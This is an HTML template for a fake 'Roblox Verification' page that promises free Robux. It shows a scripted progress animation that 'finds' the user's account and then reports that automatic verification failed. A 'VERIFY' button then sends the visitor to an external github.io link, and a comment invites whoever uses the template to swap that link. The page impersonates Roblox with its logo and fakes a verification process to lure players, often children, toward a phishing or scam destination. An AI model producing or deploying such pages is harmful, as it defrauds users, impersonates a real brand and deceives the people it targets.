<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>Roblox | Verification</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
<style>
  :root{
    --bg-1:#dfe4db;
    --bg-2:#e5e9e1;
    --card:#ffffff;
    --ink:#101418;
    --muted:#7d8591;
    --accent:#7b2cff;
    --accent-dark:#6a23f3;
    --shadow:0 14px 40px rgba(0,0,0,.18);
    --radius:28px;
    --ok:#42d742;
    --err:#ff4d7a;
  }
  *{box-sizing:border-box}
  body{
    margin:0; font-family:Inter,sans-serif; color:var(--ink);
    background:linear-gradient(180deg, var(--bg-1), var(--bg-2));
    overflow-x:hidden;
  }
  canvas#net{position:fixed; inset:0; width:100vw; height:100vh; z-index:-1; pointer-events:none; opacity:.55}

  .wrap{min-height:100vh; display:grid; place-items:center; padding:24px}
  .card{
    width:min(520px,92vw); background:var(--card); border-radius:var(--radius);
    border:3px solid var(--accent); box-shadow:var(--shadow); padding:18px 14px 22px; position:relative;
  }
  .brand-bar{position:absolute; left:50%; top:-30px; transform:translateX(-50%);
    background:#fff; border:4px solid var(--accent); border-radius:20px; padding:10px 22px;
    box-shadow:0 15px 28px rgba(92,22,255,.25);}
  .brand{height:34px; display:block}

  .status-wrap{margin-top:36px; display:grid; place-items:center; gap:14px}
  .icon{width:92px; height:92px; border-radius:20px; display:grid; place-items:center;
    background:#f4f4fb; box-shadow:inset 0 1px 0 #fff, 0 6px 16px #00000012;}
  .icon svg{width:52px; height:52px}
  .title{font-weight:900; font-size:1rem; letter-spacing:.2em; color:#6b7280}
  .bar{height:14px; width:100%; background:#ececf5; border-radius:14px; overflow:hidden}
  .fill{height:100%; width:0%; background:linear-gradient(90deg,var(--accent),var(--accent-dark)); transition:width .2s linear}

  .verify{text-align:center; margin-top:20px; display:none}
  .verify h2{margin:8px 0 4px; font-size:1.4rem}
  .money-card{margin:14px auto; width:220px; height:100px; border-radius:18px; background:#f5f6f9; 
    display:grid; place-items:center; font-weight:900; color:#444; font-size:1.3rem}
  .cta{margin-top:12px; height:62px; border-radius:20px; border:3px solid #fff;
    background:linear-gradient(180deg, var(--accent), var(--accent-dark));
    color:#fff; font-weight:900; font-size:22px; display:grid; place-items:center; cursor:pointer;
    box-shadow:0 18px 36px rgba(123,44,255,.35);}
</style>
</head>
<body>
<canvas id="net"></canvas>

<main class="wrap">
  <section class="card">
    <div class="brand-bar">
      <img class="brand" src="https://upload.wikimedia.org/wikipedia/commons/1/10/Roblox_Logo_2017.svg" alt="ROBLOX">
    </div>

    <div id="stage" class="status-wrap">
      <div class="icon" id="icon"></div>
      <div class="title" id="status">SEARCHING FOR</div>
      <h2 id="user">—</h2>
      <p id="robuxInfo" style="margin:0;font-weight:600;color:#7b2cff"></p>
      <div class="bar"><div class="fill" id="fill"></div></div>
    </div>

    <div id="verifyBlock" class="verify">
      <div class="title">VERIFICATION</div>
      <h2 id="vUser">—</h2>
      <p>Your <span id="vAmount"></span> Robux is ready. Please verify to proceed.</p>
      <div class="money-card"><span id="vAmount2"></span> Robux</div>
      <button id="goVerify" class="cta">VERIFY</button>
    </div>
  </section>
</main>

<script>
  /* خلفية الذرات */
  (function(){
    const c=document.getElementById('net'), ctx=c.getContext('2d'), dpr=window.devicePixelRatio||1;
    let W,H,pts=[];
    function resize(){W=c.width=innerWidth*dpr;H=c.height=innerHeight*dpr;ctx.setTransform(dpr,0,0,dpr,0,0);
      pts=Array.from({length:60},()=>({x:Math.random()*innerWidth,y:Math.random()*innerHeight,
        vx:(Math.random()-.5)*.4,vy:(Math.random()-.5)*.4,r:Math.random()*2+1}));
    }
    resize(); addEventListener('resize',resize);
    function step(){
      ctx.clearRect(0,0,innerWidth,innerHeight);
      for(let i=0;i<pts.length;i++){const a=pts[i];a.x+=a.vx;a.y+=a.vy;
        if(a.x<0||a.x>innerWidth) a.vx*=-1;if(a.y<0||a.y>innerHeight) a.vy*=-1;
        for(let j=i+1;j<pts.length;j++){const b=pts[j],dx=a.x-b.x,dy=a.y-b.y,dist=Math.hypot(dx,dy);
          if(dist<160){ctx.strokeStyle=`rgba(123,44,255,${(1-dist/160)*0.6})`;ctx.beginPath();ctx.moveTo(a.x,a.y);ctx.lineTo(b.x,b.y);ctx.stroke();}
        }
      }
      for(const p of pts){ctx.fillStyle='rgba(123,44,255,.9)';ctx.beginPath();ctx.arc(p.x,p.y,p.r,0,Math.PI*2);ctx.fill();}
      requestAnimationFrame(step);
    }
    step();
  })();

  /* استرجاع البيانات */
  const params=new URLSearchParams(location.search);
  const data=JSON.parse(localStorage.getItem('rbx_entry')||'{}');
  const user=params.get('u')||data.u||"User";
  const robux=params.get('r')||data.r||"1000";

  document.getElementById('user').textContent=user;
  document.getElementById('robuxInfo').textContent=robux+" Robux";

  const fill=document.getElementById('fill'), statusEl=document.getElementById('status'), icon=document.getElementById('icon');
  const verifyBlock=document.getElementById('verifyBlock'), vUser=document.getElementById('vUser');
  const vAmount=document.getElementById('vAmount'), vAmount2=document.getElementById('vAmount2');

  /* تسلسل المراحل */
  let t0=performance.now(), total=9000;
  function progress(){
    const p=Math.min(1,(performance.now()-t0)/total);
    fill.style.width=(p*100)+"%";
    if(p<.25){statusEl.textContent="SEARCHING FOR"; icon.innerHTML="🔍";}
    else if(p<.5){statusEl.textContent="USER FOUND"; icon.innerHTML="✅";}
    else if(p<.8){statusEl.textContent="LOADING…"; icon.innerHTML="⚙️";}
    else {statusEl.textContent="AUTOMATIC VERIFICATION FAILED"; icon.innerHTML="❌";}
    if(p<1) requestAnimationFrame(progress); else showVerify();
  }
  requestAnimationFrame(progress);

  function showVerify(){
    document.getElementById('stage').style.display="none";
    verifyBlock.style.display="block";
    vUser.textContent=user;
    vAmount.textContent=robux;
    vAmount2.textContent=robux;
  }

  /* زر التحقق (غيّر الرابط هنا) */
  const INSTAGRAM_URL="https://gnesvas.github.io/chjan/";
  document.getElementById('goVerify').onclick=()=>{if(INSTAGRAM_URL) location.href=INSTAGRAM_URL;}
</script>
</body>
</html>
